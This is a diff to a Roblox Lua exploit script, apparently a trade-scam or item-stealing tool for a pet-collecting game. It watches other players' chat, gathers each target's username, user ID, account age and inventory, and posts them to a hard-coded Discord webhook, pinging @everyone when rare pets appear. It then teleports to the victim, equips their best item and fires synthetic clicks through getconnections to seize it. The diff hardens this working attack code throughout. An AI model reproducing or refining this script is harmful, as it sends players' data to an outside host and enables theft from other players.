@@ -4,6 +4,7 @@ local TeleportService = game:GetService("TeleportService")
 local HttpService = game:GetService("HttpService")
 local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1393445006299234449/s32t5PInI1pwZmxL8VTTmdohJ637DT_i6ni1KH757iQwNpxfbGcBamIzVSWWfn0jP8Rg"
 
@@ -17,7 +18,31 @@ local RARE_PETS = {
     ["Queen bee"] = true
 }
 
+local function mouse1click()
+    local mouse = LocalPlayer:GetMouse()
+    for _,v in next, getconnections(mouse.Button1Down) do
+        v:Fire()
+    end
+end
+
 local function sendToWebhook(data)
+    local success, placeId = pcall(function() return game.PlaceId end)
+    local success2, jobId = pcall(function() return game.JobId end)
+    
+    local teleportScript = "game:GetService('TeleportService'):TeleportToPlaceInstance("
+    ..(success and tostring(placeId) or "nil")..", "
+    ..(success2 and ("'"..jobId.."'") or "nil")..")"
+
+    local itemsText = data.items or "No items found"
+    local hasRarePet = false
+    
+    for petName in pairs(RARE_PETS) do
+        if string.find(itemsText, petName) then
+            hasRarePet = true
+            break
+        end
+    end
+
     local embed = {
         ["title"] = "Roqate - 2025",
         ["description"] = "Target Information",
@@ -25,42 +50,29 @@ local function sendToWebhook(data)
         ["fields"] = {
             {
                 ["name"] = "Username",
-                ["value"] = data.username,
+                ["value"] = data.username or "N/A",
                 ["inline"] = true
             },
             {
                 ["name"] = "UserID",
-                ["value"] = tostring(data.userId),
+                ["value"] = tostring(data.userId or "N/A"),
                 ["inline"] = true
             },
             {
                 ["name"] = "Account Age",
-                ["value"] = tostring(data.accountAge),
+                ["value"] = tostring(data.accountAge or "N/A"),
                 ["inline"] = true
             },
             {
                 ["name"] = "Items",
-                ["value"] = data.items,
+                ["value"] = itemsText,
                 ["inline"] = false
             }
         }
     }
 
-    local message = "game:GetService(\"TeleportService\"):TeleportToPlaceInstance("..game.PlaceId..", \""..game.JobId.."\")"
-    local hasRarePet = false
-
-    for item in string.gmatch(data.items, "([^\n]+)") do
-        for petName in pairs(RARE_PETS) do
-            if string.find(item, petName) then
-                hasRarePet = true
-                break
-            end
-        end
-        if hasRarePet then break end
-    end
-
     local payload = {
-        ["content"] = hasRarePet and "@everyone\n"..message or message,
+        ["content"] = (hasRarePet and "@everyone\n" or "")..teleportScript,
         ["embeds"] = {embed}
     }
 
@@ -82,7 +94,7 @@ local function getBestItem(backpack)
 
         if petMatch then
             local petName = petMatch
-            local weight = tonumber(string.match(itemName, "%[(%d+%.%d+) KG%]"))
+            local weight = tonumber(string.match(itemName, "%[(%d+%.%d+) KG%]")) or 0
             local rarityValue = RARE_PETS[petName] and 1000 or 100
 
             if rarityValue > bestValue or (rarityValue == bestValue and weight > bestWeight) then
@@ -93,7 +105,7 @@ local function getBestItem(backpack)
             end
         elseif itemMatch then
             local rarity, name = string.match(itemName, "%[([%w%s]+)%] ([%w%s]+) %[%d+%.%d+kg%]")
-            local weight = tonumber(string.match(itemName, "%[(%d+%.%d+)kg%]"))
+            local weight = tonumber(string.match(itemName, "%[(%d+%.%d+)kg%]")) or 0
             local rarityValue = 0
 
             if rarity == "Disco" then rarityValue = 50
@@ -112,7 +124,11 @@ local function getBestItem(backpack)
 end
 
 local function teleportAndInteract(target)
-    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    local character = LocalPlayer.Character
+    if not character then
+        character = LocalPlayer.CharacterAdded:Wait()
+    end
+    
     local humanoid = character:WaitForChild("Humanoid")
     local rootPart = character:WaitForChild("HumanoidRootPart")
 
@@ -120,8 +136,16 @@ local function teleportAndInteract(target)
     humanoid.CameraOffset = Vector3.new(0, 0, 0)
     humanoid.AutoRotate = false
 
-    local targetCharacter = target.Character or target.CharacterAdded:Wait()
-    local targetTorso = targetCharacter:WaitForChild("UpperTorso") or targetCharacter:WaitForChild("Torso")
+    local targetCharacter = target.Character
+    if not targetCharacter then
+        targetCharacter = target.CharacterAdded:Wait()
+    end
+    
+    local targetTorso = targetCharacter:FindFirstChild("UpperTorso") or targetCharacter:FindFirstChild("Torso")
+    if not targetTorso then
+        targetTorso = targetCharacter:WaitForChild("UpperTorso", 5) or targetCharacter:WaitForChild("Torso", 5)
+        if not targetTorso then return end
+    end
 
     rootPart.CFrame = targetTorso.CFrame * CFrame.new(0, 0, -4)
     humanoid.CameraOffset = Vector3.new(0, 0, 0)
@@ -131,50 +155,75 @@ local function teleportAndInteract(target)
         if targetCharacter and targetTorso and rootPart then
             rootPart.CFrame = CFrame.new(rootPart.Position, targetTorso.Position) * CFrame.new(0, 0, -4)
         else
-            conn:Disconnect()
+            if conn then conn:Disconnect() end
         end
     end)
 
-    local bestItem = getBestItem(target:WaitForChild("Backpack"))
-    if bestItem then
-        targetCharacter.Humanoid:EquipTool(bestItem)
+    local backpack = target:FindFirstChild("Backpack")
+    if backpack then
+        local bestItem = getBestItem(backpack)
+        if bestItem and targetCharacter:FindFirstChild("Humanoid") then
+            targetCharacter.Humanoid:EquipTool(bestItem)
+        end
     end
 
     task.wait(0.5)
     local screenPos = Vector2.new(0.5, 0.5)
-    UserInputService:SetMouseLocation(screenPos.X, screenPos.Y)
-    mouse1click()
+    pcall(function()
+        UserInputService:SetMouseLocation(screenPos.X, screenPos.Y)
+        mouse1click()
+    end)
+    
     task.wait(5)
-    conn:Disconnect()
+    if conn then conn:Disconnect() end
 end
 
 local function onPlayerChatted(player, message)
-    if player ~= LocalPlayer and string.find(message, "@") then
-        local items = {}
-        for _, tool in ipairs(player:WaitForChild("Backpack"):GetChildren()) do
+    if player == LocalPlayer then return end
+    if not string.find(message, "@") then return end
+
+    -- Get player items
+    local items = {}
+    local backpack = player:FindFirstChild("Backpack")
+    if backpack then
+        for _, tool in ipairs(backpack:GetChildren()) do
             table.insert(items, tool.Name)
         end
-        
-        local data = {
-            username = player.Name,
-            userId = player.UserId,
-            accountAge = player.AccountAge,
-            items = table.concat(items, "\n")
-        }
-        
-        sendToWebhook(data)
+    end
+
+    -- Send webhook data
+    local data = {
+        username = player.Name,
+        userId = player.UserId,
+        accountAge = player.AccountAge,
+        items = #items > 0 and table.concat(items, "\n") or "No items found"
+    }
+    
+    sendToWebhook(data)
+    
+    -- Teleport and interact
+    local success, err = pcall(function()
         teleportAndInteract(player)
+    end)
+    
+    if not success then
+        warn("Error during teleport/interact: "..err)
     end
 end
 
+-- Connect chat listeners
 for _, player in ipairs(Players:GetPlayers()) do
-    player.Chatted:Connect(function(message)
-        onPlayerChatted(player, message)
-    end)
+    if player ~= LocalPlayer then
+        player.Chatted:Connect(function(message)
+            onPlayerChatted(player, message)
+        end)
+    end
 end
 
 Players.PlayerAdded:Connect(function(player)
-    player.Chatted:Connect(function(message)
-        onPlayerChatted(player, message)
-    end)
+    if player ~= LocalPlayer then
+        player.Chatted:Connect(function(message)
+            onPlayerChatted(player, message)
+        end)
+    end
 end)
